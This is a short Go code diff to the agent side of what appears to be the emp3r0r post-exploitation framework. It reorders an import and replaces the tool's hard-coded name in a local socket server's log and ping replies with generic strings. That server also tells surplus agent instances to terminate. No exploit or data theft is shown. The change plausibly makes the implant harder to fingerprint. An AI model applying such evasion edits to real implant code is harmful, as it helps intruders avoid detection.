@@ -2,10 +2,11 @@ package main
 
 import (
 	"fmt"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net"
 	"os"
 	"strconv"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
@@ -41,7 +42,7 @@ func socket_server(c net.Conn) {
 			logging.Printf("Invalid PID from ping: %v", err)
 			continue
 		}
-		logging.Printf("emp3r0r instance got ping from PID: %d", pid)
+		logging.Printf("agent instance got ping from PID: %d", pid)
 
 		// check if agents are still alive, remove dead agents
 		for _, pid := range AgentWaitQueue {
@@ -51,11 +52,11 @@ func socket_server(c net.Conn) {
 			}
 		}
 
-		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
+		reply := fmt.Sprintf("%s running on PID %d", def.TransportString, os.Getpid())
 		if len(AgentWaitQueue) > 3 {
 			logging.Printf("Wait queue (sorted): %v", AgentWaitQueue)
 			logging.Println("Too many agents waiting, will start to kill...")
-			reply = "emp3r0r wants you to kill yourself"
+			reply = "kill yourself"
 		} else {
 			AgentWaitQueue = append(AgentWaitQueue, int(pid))
 			AgentWaitQueue = util.RemoveDupsFromArray(AgentWaitQueue)
